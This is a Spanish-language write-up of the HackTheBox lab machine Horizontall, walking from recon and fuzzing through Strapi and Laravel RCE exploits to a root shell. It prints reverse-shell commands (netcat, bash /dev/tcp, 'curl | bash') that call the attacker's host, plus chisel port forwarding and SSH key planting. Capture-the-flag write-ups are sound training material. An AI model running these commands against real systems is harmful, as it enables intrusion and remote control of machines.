---
title: "Horinzontall"
date: 2025-05-29 16:41:31 +0200
categories: writeups HackTheBox
tags: infoleak cve rce strapi laravel portforwarding máquina linux
description: Writeup de la máquina Horinzontall de Hackthebox.
image: ../assets/images/posts/logos/hackthebox.png
---
## Reconocimiento

En primer lugar, debemos desplegar la máquina para poder obtener la **Dirección IP** todo ello desde la web de **HackTheBox** y luego desde la **terminal** debemos conectarnos a la VPN usando el fichero correspondiente de la siguiente forma:

```bash
openvpn lab_trr0r.opvn
```

Después le lanzaremos un **ping** para ver si se encuentra activa dicha máquina, además de ver si acepta la traza **ICM**. Comprobamos que efectivamente nos devuelve el paquete que le enviamos por lo que acepta la traza **ICMP**, gracias al **ttl** podremos saber si se trata de una máquina **Linux (TTL 64 )** y **Windows (TTL 128)**, y vemos que se trata de una máquina **Linux** pues cuenta con **TTL** próximo a 64 (**63**), además gracias al script ****whichSystem.py**** podremos conocer dicha información.

![](<../assets/images/posts/2025-05-29-horinzontall/Pasted image 20241227005823.png>)

> El motivo por el cual el **TTL** es de **63** es porque el paquete pasa por unos intermediarios (routers) antes de llegar a su destino (máquina atacante). Esto podemos comprobarlo con el comando `ping -c 1 -R 10.10.11.105`.
### Nmap

En segundo lugar, realizaremos un escaneo usando **Nmap** para ver que puertos de la máquina víctima se encuentra abiertos.

```bash
nmap -p- --open --min-rate 5000 -sS -v -Pn -n 10.10.11.105 -oG allPorts
```

Observamos como nos reporta que se encuentran abiertos los puertos **22 y 80**.

![](<../assets/images/posts/2025-05-29-horinzontall/Pasted image 20241227005926.png>)

Ahora, gracias a la utilidad **getPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.

A continuación, volveremos a realizar un escaneo con **Nmap**, pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto.

```bash
nmap -p22,80 -sCV 10.10.11.105 -oN targeted
```

Realmente podemos sacar poca información del escaneo de **Nmap** pero algo que podemos tener en cuenta es que la versión del **OpenSSH** es vulnerable a un **User Enumeration**.

![](<../assets/images/posts/2025-05-29-horinzontall/Pasted image 20241227010029.png>)
___
## Explotación

Al tener tan pocas opciones sabremos que la intrusión a la máquina irá a través de la página web alojada en puerto **80**. Al realizar un `whatweb` sobre la página web veremos que nos da un error el cual nos está indicando que es incapaz de redireccionar a la página `horizontall.htb`.

```bash
whatweb http://10.10.11.105
```

![](<../assets/images/posts/2025-05-29-horinzontall/Pasted image 20241227010250.png>)

Para solucionar este problema tenemos que aplicar **Virtual Hosting** para ello abrimos el `/etc/hosts` y añadimos la siguiente línea: `10.10.11.105  horizontall.htb`.

Ahora veremos que al correr de nuevo el comando de `whatweb` sobre la página web no nos dará ningún error, al igual que si accedemos a través del navegador no tendremos ningún problema.

![](<../assets/images/posts/2025-05-29-horinzontall/Pasted image 20241227010705.png>)

El aspecto de la página web es el siguiente, en primer lugar navegaremos por la página y como no vemos nada interesante realizaremos fuzzing de directorios con **Gobuster** o cualquier otra herramienta, aunque finalmente no encontraremos nada en la página web.

![](<../assets/images/posts/2025-05-29-horinzontall/Pasted image 20241227010826.png>)

Tras buscar en la página web nos daremos cuenta que no hay nada interesante por lo que trataremos de hacer fuzzing de subdominios con **Wfuzz** de la siguiente forma:

```bash
wfuzz -c -u http://horizontall.htb -H 'Host: FUZZ.horizontall.htb' -w
/usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt --hh 194
```

Observamos como nos reporta que existe un subdominio llamado **api-prod**.

![](<../assets/images/posts/2025-05-29-horinzontall/Pasted image 20241227012854.png>)

> Otra forma de descubrir el subdominio es a través del código fuente de la página web gracias al siguiente comando buscaremos por recursos externos en dicho código fuente: `curl -s -X GET http://horizontall.htb/ | htmlq -p | bat -l html | grep -oP '".*?"' | grep "app\." | sort -u`. 
> Finalmente, para descubrir dicho dominio debemos de ejecutar el siguiente comando el cual busca por la palabra **http** dentro de recurso previamente encontrado: `curl -s -X GET http://horizontall.htb/js/app.c68eb462.js | grep -oP '".*?"' | grep http | sort -u`

Una vez hemos encontrado el subdominio volveremos a aplicar **Virtual Hosting** para ello abrimos el `/etc/hosts` y lo actualizamos a: `10.10.11.105  horizontall.htb api-prod.horizontall.htb`.

Veremos que al acceder a dicho subdominio ha cambiado la página por lo que el **Virtual Hosting** se está aplicando correctamente como en dicha página no encontramos mucha información pasaremos a hacer fuzzing.

![](<../assets/images/posts/2025-05-29-horinzontall/Pasted image 20241227013626.png>)

Por cambiar un poco realizaremos el fuzzing de directorios usando **Ffuf**, es decir ejecutaremos el siguiente comando:

```bash
ffuf -c -u http://api-prod.horizontall.htb/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -e '.php,.html,.js,.txt'
```

Observamos que nos reporta varios directorios y fichero pero el que nos llama la atención es el **admin**.

![](<../assets/images/posts/2025-05-29-horinzontall/Pasted image 20241227013845.png>)

Nos dirigiremos a dicha página en el navegador la cual nos redirige a **/auth/login** y además observamos que estamos ante el CMS **Strapi**.

![](<../assets/images/posts/2025-05-29-horinzontall/Pasted image 20241227014218.png>)

Como no vemos nada interesante volveremos a realizar fuzzing pero esta vez sobre el directorio **/admin** para ello ejecutaremos el siguiente comando de **Ffuf**

```bash
ffuf -c -u http://api-prod.horizontall.htb/admin/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -e '.php,.html,.js,.txt' -fs 854
```

Observamos que nos reporta varias rutas:

![](<../assets/images/posts/2025-05-29-horinzontall/Pasted image 20241227014321.png>)

Al acceder al **/init** veremos la versión de **Strapi** gracias a un **Information Leakage**. 

> Destacar que en la ruta **admin/strapiVersion** también somos capaces de ver la versión de **Strapi**.

![](<../assets/images/posts/2025-05-29-horinzontall/Pasted image 20241227014838.png>)

Usaremos **searchsploit** para buscar por exploits vulnerables a dicha versión de **Strapi** y veremos como existe un RCE para esa versión en específico por lo que nos descargaremos dicho exploit con `searchsploit -m multiple/webapps/50239.py`.

![](<../assets/images/posts/2025-05-29-horinzontall/Pasted image 20241227015249.png>)

Ejecutaremos dicho exploit pasando la URL de donde se está alojando el **Strapi** y automáticamente nos otorgará una **blind shell**.

```bash
python3 strapi_exploit.py http://api-prod.horizontall.htb
```


Para comprobar que realmente la shell otorgada funciona y que corresponde a la máquina víctima nos lanzaremos un **ping** a nuestra **Dirección IP** y tras previamente habernos puesto en escucha con **tshark** veremos como recibimos el ping desde la **Dirección IP** de la máquina víctima por lo que todo está correcto.

![](<../assets/images/posts/2025-05-29-horinzontall/Pasted image 20241227015558.png>)

En este punto lo que haremos será enviarnos una **Reverse Shell** con la cual tendremos problemas con los payloads, tras probar y probar payloads uno válido es el siguiente:

```bash
busybox nc 10.10.14.5 443 -e /bin/bash
```

![](<../assets/images/posts/2025-05-29-horinzontall/Pasted image 20241227015951.png>)

> Otra alternativa de payload para recibir la **Reverse Shell** y que casi nunca falla es la siguiente forma. En primer lugar, en nuestra máquina de atacante nos creamos un archivo llamado **index.html** con un payload básico de una **Reverse Shell** de bash, luego nos montaremos un servidor con python en el mismo directorio, nos pondremos en escucha por el puerto establecido y por último en la máquina víctima ejecutaremos `curl http://10.10.14.5 | bash`.
> 
> ![](<../assets/images/posts/2025-05-29-horinzontall/Pasted image 20241227020907.png>)

___
## Escalada de privilegios

Una vez realizado el **Tratamiento de la TTY** podemos proceder con la escalada de privilegios, como en todas las máquina buscaremos los principales vectores para elevar nuestros privilegios como lo son **Sudoers** o **SUID** pero en está máquina la escalada no va por ahí. 

Al mirar por los **servicios internos del sistema** gracias a `ss -tlnp` veremos dos servicios interesantes uno corriendo por el puerto **3306** correspondiente a un servidor de **MySQL** y otro por el puerto **8080** que es un servidor web.

![](<../assets/images/posts/2025-05-29-horinzontall/Pasted image 20241227152942.png>)
### MySQL (3306)

En primer lugar nos centraremos en el servidor de **MySQL** haremos una búsqueda por archivos que contengan la palabra `password` dentro del directorio **/opt/strapi/myapi/config** de la siguiente forma:

```bash
grep -r -i password .
```

Observamos que nos encuentra una contraseña en el fichero **database.json* 

![](<../assets/images/posts/2025-05-29-horinzontall/Pasted image 20241227153711.png>)

Si miramos el contenido de dicho fichero veremos un usuario y una contraseña.

![](<../assets/images/posts/2025-05-29-horinzontall/Pasted image 20241227153751.png>)

Una vez que tenemos el usuario y la contraseña probaremos a autenticarnos vía **mysql command-line** y veremos que accedemos correctamente.

![](<../assets/images/posts/2025-05-29-horinzontall/Pasted image 20241227153954.png>)

Tras navegar por las diferentes bases de datos lo único interesante que encontraremos será lo siguiente, aunque realmente no tiene ninguna importancia pues es el usuario que ha creado automáticamente el exploit de **Strapi** que nos otorgaba una **blind shell**.

![](<../assets/images/posts/2025-05-29-horinzontall/Pasted image 20241227154101.png>)
### HTTP (8080)

Tras observar que en el puerto **3306** de **MySQL** no existe ninguna información valiosa nos pasaremos a pentestear la página web alojada en el puerto **8080**. Para trabajar cómodamente sobre esta página web debemos hacer **Port Forwarding** el cual se puede realizar de dos formas en está máquina.

> Una de las formas de realizar **Port Forwarding** es usando **chisel**, para ello debemos transferirnos **chisel** a la máquina víctima montándonos un servidor con python (`python3 -m http.server 80`) y desde la máquina víctima nos lo descargamos (`wget 10.10.14.5/chisel`). 

> La otra forma de realizar **Port Forwarding** es usando **ssh**, para ello podemos meter nuestra clave pública en el authorized_keys (`echo -n "ssh-rsa AAAAB3... terror@parrot" > authorized_keys`) y luego en la máquina atacante nos conectamos usando nuestra la clave privada y aplicando **Local Port Forwarding** (`ssh -i /home/terror/.ssh/id_rsa strapi@10.10.11.105 -L 8000:127.0.0.1:8000`).

Una vez tenemos el **chisel** en ambas máquina en la máquina atacante ejecutaremos lo siguiente:

```bash
./chisel server --reverse -p 1234
```

Y en la máquina víctima nos conectaremos al servidor de la siguiente forma:

```bash
./chisel client 10.10.14.5:1234 R:8000:127.0.0.1:8000
```

Si nos dirigimos al nuestro puerto **8000** veremos como hemos conseguido traernos la página web alojada en puerto **8000** que está en la máquina víctima gracias al **Port Forwarding**. Lo primero que nos salta a la vista es el **Information Leakage** de la version de Laravel (**8**) y de PHP (**7.4.18**).

![](<../assets/images/posts/2025-05-29-horinzontall/Pasted image 20241227155322.png>)

Usaremos **searchsploit** para buscar por exploits para dicha versión de Laravel y nos encontraremos con otro **RCE**.

![](<../assets/images/posts/2025-05-29-horinzontall/Pasted image 20241227161019.png>)

Realizaremos fuzzing de directorios sobre la página web alojada en puerto **8000** usando **Ffuf** de la siguiente forma:

```bash
ffuf -c -u http://localhost:8000/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -e '.php,.txt,.js,.html'
```

Observamos como nos reporta varios archivos y una ruta a la que aparentemente no tenemos acceso.

![](<../assets/images/posts/2025-05-29-horinzontall/Pasted image 20241227160635.png>)

Si accedemos a la ruta **/profiles** sorprendentemente nos deja acceder y además podremos ver la versión en específico de Laravel (**8.43.0**).

![](<../assets/images/posts/2025-05-29-horinzontall/Pasted image 20241227160903.png>)

En este punto lo que haremos será descargarnos dicho script con `searchsploit -m php/webapps/49424.py` y al intentar ejecutar dicho script veremos que nos pide la ruta del log **laravel.log**.

![](<../assets/images/posts/2025-05-29-horinzontall/Pasted image 20241227162627.png>)

Para descubrir dicha ruta nos dirigimos a **/profiles** y veremos que el servidor está montado en **/home/developer/myproject** por lo que el fichero de los logs ha de estar en **/home/developer/myproject/storage/logs/laravel.log**.

> En caso de no conocer la ruta donde está montado el proyecto podemos usar este script: **Laravel - RCE](https://github.com/nth347/CVE-2021-3129_exploit) el cual usa rutas relativas para acceder al **laravel.log** gracias a los [Wrappers de PHP**.

![](<../assets/images/posts/2025-05-29-horinzontall/Pasted image 20241227162727.png>)

> Una vez conocemos la ruta del **laravel.log** ejecutaremos el exploit pero por algún motivo el cual desconozco no es capaz de ejecutar algunos comandos lo cual nos puede dar a pensar que el **exploit** no funciona.
> ![](<../assets/images/posts/2025-05-29-horinzontall/Pasted image 20241227163500.png>)

En este punto lo que tenemos que hacer es ponernos escucha con **NetCat** (`nc -nlvp 443`) y mandarnos una **Reverse Shell** ejecutando el exploit de la siguiente forma: 

```bash
python3 laravel_exploit.py http://127.0.0.1:8000 /home/developer/myproject/storage/logs/laravel.log 'bash -c "bash -i >& /dev/tcp/10.10.14.5/443 0>&1"'
```

Observamos como recibimos la **Reverse Shell** como **root** por lo que ya habríamos **pwneado** la máquina.

> Al cabo de unos minutos por algún motivo el cual desconozco la terminal como **root** se cierra debido a que el proceso de **chisel** en la máquina víctima es matado, en el caso de que hubiéramos realizamos el **Port Forwarding** con **ssh** no tendríamos este problema.

![](<../assets/images/posts/2025-05-29-horinzontall/Pasted image 20241227164018.png>)